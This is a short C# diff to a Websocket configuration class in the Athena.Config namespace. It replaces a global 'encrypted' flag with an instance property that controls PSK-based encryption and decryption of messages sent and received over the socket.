@@ -44,6 +44,7 @@ namespace Athena.Config
         public bool encryptedExchangeCheck { get; set; }
         public ClientWebSocket ws { get; set; }
         public PSKCrypto crypt { get; set; }
+        public bool encrypted { get; set; }
 
         public Websocket(string uuid)
         {
@@ -58,7 +59,7 @@ namespace Athena.Config
             if (!string.IsNullOrEmpty(this.psk))
             {
                 this.crypt = new PSKCrypto(uuid, this.psk);
-                Globals.encrypted = true;
+                this.encrypted = true;
             }
 
             this.ws = new ClientWebSocket();
@@ -88,7 +89,7 @@ namespace Athena.Config
             try
             {
                 string json = JsonConvert.SerializeObject(obj);
-                if (Globals.encrypted)
+                if (this.encrypted)
                 {
                     json = this.crypt.Encrypt(json);
                 }
@@ -108,7 +109,7 @@ namespace Athena.Config
                 message = await Receive(ws);
                 m = JsonConvert.DeserializeObject<WebSocketMessage>(message);
 
-                if (Globals.encrypted)
+                if (this.encrypted)
                 {
                     return this.crypt.Decrypt(m.Data);
                 }
